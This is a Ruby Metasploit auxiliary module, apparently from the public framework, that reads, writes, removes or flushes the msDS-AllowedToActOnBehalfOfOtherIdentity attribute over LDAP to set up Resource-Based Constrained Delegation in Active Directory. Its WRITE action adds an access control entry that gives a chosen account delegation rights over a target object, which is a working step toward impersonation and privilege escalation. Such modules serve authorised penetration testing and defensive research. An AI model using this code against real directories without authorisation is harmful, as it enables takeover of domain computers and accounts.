##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP::ActiveDirectory
  include Msf::OptionalSession::LDAP

  ATTRIBUTE = 'msDS-AllowedToActOnBehalfOfOtherIdentity'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Role Base Constrained Delegation',
        'Description' => %q{
          This module can read and write the necessary LDAP attributes to configure a particular object for Role Based
          Constrained Delegation (RBCD). When writing, the module will add an access control entry to allow the account
          specified in DELEGATE_FROM to the object specified in DELEGATE_TO. In order for this to succeed, the
          authenticated user must have write access to the target object (the object specified in DELEGATE_TO).
        },
        'Author' => [
          'Podalirius', # Remi Gascou (@podalirius_), Impacket reference implementation
          'Charlie Bromberg', # Charlie Bromberg (@_nwodtuhs), Impacket reference implementation
          'Spencer McIntyre' # module author
        ],
        'References' => [
          ['URL', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution'],
          ['URL', 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd'],
          ['URL', 'https://github.com/SecureAuthCorp/impacket/blob/3c6713e309cae871d685fa443d3e21b7026a2155/examples/rbcd.py']
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
          ['FLUSH', { 'Description' => 'Delete the security descriptor' }],
          ['READ', { 'Description' => 'Read the security descriptor' }],
          ['REMOVE', { 'Description' => 'Remove matching ACEs from the security descriptor DACL' }],
          ['WRITE', { 'Description' => 'Add an ACE to the security descriptor DACL' }]
        ],
        'DefaultAction' => 'READ',
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [CONFIG_CHANGES], # REMOVE, FLUSH, WRITE all make changes
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('DELEGATE_TO', [ true, 'The delegation target' ]),
      OptString.new('DELEGATE_FROM', [ false, 'The delegation source' ])
    ])
  end

  def build_ace(sid)
    Rex::Proto::MsDtyp::MsDtypAce.new({
      header: {
        ace_type: Rex::Proto::MsDtyp::MsDtypAceType::ACCESS_ALLOWED_ACE_TYPE
      },
      body: {
        access_mask: Rex::Proto::MsDtyp::MsDtypAccessMask::ALL,
        sid: sid
      }
    })
  end

  def get_delegate_to_obj
    delegate_to = datastore['DELEGATE_TO']
    if delegate_to.blank?
      fail_with(Failure::BadConfig, 'The DELEGATE_TO option must be specified for this action.')
    end

    obj = adds_get_object_by_samaccountname(@ldap, delegate_to)
    if obj.nil? && !delegate_to.end_with?('$')
      obj = adds_get_object_by_samaccountname(@ldap, "#{delegate_to}$")
    end
    fail_with(Failure::NotFound, "Failed to find sAMAccountName: #{delegate_to}") unless obj

    obj
  end

  def get_delegate_from_obj
    delegate_from = datastore['DELEGATE_FROM']
    if delegate_from.blank?
      fail_with(Failure::BadConfig, 'The DELEGATE_FROM option must be specified for this action.')
    end

    obj = adds_get_object_by_samaccountname(@ldap, delegate_from)
    if obj.nil? && !delegate_from.end_with?('$')
      obj = adds_get_object_by_samaccountname(@ldap, "#{delegate_from}$")
    end
    fail_with(Failure::NotFound, "Failed to find sAMAccountName: #{delegate_from}") unless obj

    obj
  end

  def check
    ldap_connect do |ldap|
      validate_bind_success!(ldap)

      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = ldap.base_dn)
          print_warning("Couldn't discover base DN!")
        end
      end
      @ldap = ldap

      obj = get_delegate_to_obj
      if obj.nil?
        return Exploit::CheckCode::Unknown('Failed to find the specified object.')
      end

      unless adds_obj_grants_permissions?(@ldap, obj, SecurityDescriptorMatcher::Allow.all(%i[RP WP]))
        return Exploit::CheckCode::Safe('The object can not be written to.')
      end

      Exploit::CheckCode::Vulnerable('The object can be written to.')
    end
  end

  def run
    ldap_connect do |ldap|
      validate_bind_success!(ldap)

      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = ldap.base_dn)
          print_warning("Couldn't discover base DN!")
        end
      end
      @ldap = ldap

      obj = get_delegate_to_obj

      send("action_#{action.name.downcase}", obj)
    end
  rescue Errno::ECONNRESET
    fail_with(Failure::Disconnected, 'The connection was reset.')
  rescue Rex::ConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
    fail_with(Failure::NoAccess, e.message)
  rescue Net::LDAP::Error => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def action_read(obj)
    if obj[ATTRIBUTE].first.nil?
      print_status("The #{ATTRIBUTE} field is empty.")
      return
    end

    security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(obj[ATTRIBUTE].first)
    if (sddl = sd_to_sddl(security_descriptor))
      vprint_status("#{ATTRIBUTE}: #{sddl}")
    end

    if security_descriptor.dacl.nil?
      print_status("The #{ATTRIBUTE} DACL field is empty.")
      return
    end

    print_status('Allowed accounts:')
    security_descriptor.dacl.aces.each do |ace|
      account_name = adds_get_object_by_sid(@ldap, ace.body.sid)
      if account_name
        print_status("  #{ace.body.sid} (#{account_name[:sAMAccountName].first})")
      else
        print_status("  #{ace.body.sid}")
      end
    end
  end

  def action_remove(obj)
    delegate_from = get_delegate_from_obj

    security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(obj[ATTRIBUTE].first)
    unless security_descriptor.dacl && !security_descriptor.dacl.aces.empty?
      print_status('No DACL ACEs are present. No changes are necessary.')
      return
    end

    aces = security_descriptor.dacl.aces.snapshot
    aces.delete_if { |ace| ace.body.sid == delegate_from[:objectSid].first }
    delta = security_descriptor.dacl.aces.length - aces.length
    if delta == 0
      print_status('No DACL ACEs matched. No changes are necessary.')
      return
    else
      print_status("Removed #{delta} matching ACE#{delta > 1 ? 's' : ''}.")
    end
    security_descriptor.dacl.aces = aces
    # clear these fields so they'll be calculated automatically after the update
    security_descriptor.dacl.acl_count.clear
    security_descriptor.dacl.acl_size.clear

    @ldap.replace_attribute(obj.dn, ATTRIBUTE, security_descriptor.to_binary_s)
    validate_query_result!(@ldap.get_operation_result.table)

    print_good("Successfully updated the #{ATTRIBUTE} attribute.")
  end

  def action_flush(obj)
    unless obj[ATTRIBUTE]&.first
      print_status("The #{ATTRIBUTE} field is empty. No changes are necessary.")
      return
    end

    @ldap.delete_attribute(obj.dn, ATTRIBUTE)
    validate_query_result!(@ldap.get_operation_result.table)

    print_good("Successfully deleted the #{ATTRIBUTE} attribute.")
  end

  def action_write(obj)
    delegate_from = get_delegate_from_obj
    if obj[ATTRIBUTE]&.first
      _action_write_update(obj, delegate_from)
    else
      _action_write_create(obj, delegate_from)
    end
  end

  def _action_write_create(obj, delegate_from)
    vprint_status("Creating new #{ATTRIBUTE}...")
    delegate_from_sid = Rex::Proto::MsDtyp::MsDtypSid.read(delegate_from[:objectSid].first)
    security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.new
    security_descriptor.owner_sid = Rex::Proto::MsDtyp::MsDtypSid.new('S-1-5-32-544')
    security_descriptor.dacl = Rex::Proto::MsDtyp::MsDtypAcl.new
    security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS
    security_descriptor.dacl.aces << build_ace(delegate_from_sid)

    if (sddl = sd_to_sddl(security_descriptor))
      vprint_status("New #{ATTRIBUTE}: #{sddl}")
    end

    @ldap.add_attribute(obj.dn, ATTRIBUTE, security_descriptor.to_binary_s)
    validate_query_result!(@ldap.get_operation_result.table)

    print_good("Successfully created the #{ATTRIBUTE} attribute.")
    print_status('Added account:')
    print_status("  #{delegate_from_sid} (#{delegate_from[:sAMAccountName].first})")
  end

  def _action_write_update(obj, delegate_from)
    vprint_status("Updating existing #{ATTRIBUTE}...")
    security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(obj[ATTRIBUTE].first)

    if (sddl = sd_to_sddl(security_descriptor))
      vprint_status("Old #{ATTRIBUTE}: #{sddl}")
    end

    if security_descriptor.dacl
      if security_descriptor.dacl.aces.any? { |ace| ace.body.sid == delegate_from[:objectSid].first }
        print_status("Delegation from #{delegate_from[:sAMAccountName].first} to #{obj[:sAMAccountName].first} is already configured.")
      end
      # clear these fields so they'll be calculated automatically after the update
      security_descriptor.dacl.acl_count.clear
      security_descriptor.dacl.acl_size.clear
    else
      security_descriptor.control.dp = 1
      security_descriptor.dacl = Rex::Proto::MsDtyp::MsDtypAcl.new
      security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS
    end

    delegate_from_sid = Rex::Proto::MsDtyp::MsDtypSid.read(delegate_from[:objectSid].first)
    security_descriptor.dacl.aces << build_ace(delegate_from_sid)

    if (sddl = sd_to_sddl(security_descriptor))
      vprint_status("New #{ATTRIBUTE}: #{sddl}")
    end

    @ldap.replace_attribute(obj.dn, ATTRIBUTE, security_descriptor.to_binary_s)
    validate_query_result!(@ldap.get_operation_result.table)

    print_good("Successfully updated the #{ATTRIBUTE} attribute.")
  end

  def sd_to_sddl(sd)
    sd.to_sddl_text
  rescue StandardError => e
    elog('failed to parse a binary security descriptor to SDDL', error: e)
  end
end
